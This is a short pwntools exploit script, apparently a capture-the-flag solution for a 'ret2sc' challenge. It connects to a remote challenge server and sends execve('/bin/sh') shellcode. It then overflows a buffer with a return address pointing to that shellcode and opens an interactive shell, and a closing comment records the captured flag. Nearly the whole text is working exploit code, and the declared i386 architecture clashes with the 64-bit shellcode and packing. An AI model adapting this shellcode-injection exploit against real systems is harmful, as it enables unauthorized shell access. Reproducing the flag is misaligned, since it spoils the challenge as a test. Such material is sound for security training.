from pwn import*
context(os='linux',arch='i386',log_level='debug')

n=remote('isc.taiwan-te.ch', 10002)
#n=process('./ret2sc')


n.recvuntil(':')

n.sendline('\x90\x90\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05')

n.recvuntil(':')
n.sendline('a'*0x18+p64(0x601060))
n.interactive()

#FLAG{sh311c0d3_3v3ry7h1ng}
